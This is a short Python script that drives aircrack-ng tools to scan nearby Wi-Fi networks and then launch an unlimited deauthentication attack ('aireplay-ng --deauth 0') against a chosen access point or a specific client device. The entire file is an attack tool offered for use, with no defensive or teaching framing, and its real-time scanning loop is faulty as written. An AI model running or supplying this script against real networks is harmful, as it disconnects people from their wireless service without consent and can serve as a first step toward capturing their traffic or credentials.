import subprocess
import time

# Display available interfaces
print("Available network interfaces:")
subprocess.run(["iwconfig"])

# Get interface name from user
interface = input("Enter the network interface name: ")

# Start monitoring mode if desired
monitoring_choice = input("Do you want the network interface to be in monitor mode? (y/n): ")
if monitoring_choice.lower() == "y":
    subprocess.run(["airmon-ng", "start", interface])
    subprocess.run(["airmon-ng", "check", "kill", interface])

# Scan for available Wi-Fi networks
while True:
    try:
        output = subprocess.check_output(["airodump-ng", interface])
        print(output.decode("utf-8")) # Print results in real-time
        time.sleep(2)
    except KeyboardInterrupt:
        break

# Ask user for BSSID and channel
bssid = input("Enter the BSSID of the desired Wi-Fi: ")
channel = input("Enter the channel of the desired Wi-Fi: ")

# Attack the Wi-Fi
destination_choice = input("Do you want your attack to be of type Destination? (y/n): ")
if destination_choice.lower() == "y":
    destination = input("Enter the MAC address of the device you want to attack: ")
    subprocess.run(["aireplay-ng", "--deauth", "0", "-a", bssid, "-c", destination, interface])
else:
    subprocess.run(["aireplay-ng", "--deauth", "0", "-a", bssid, interface])
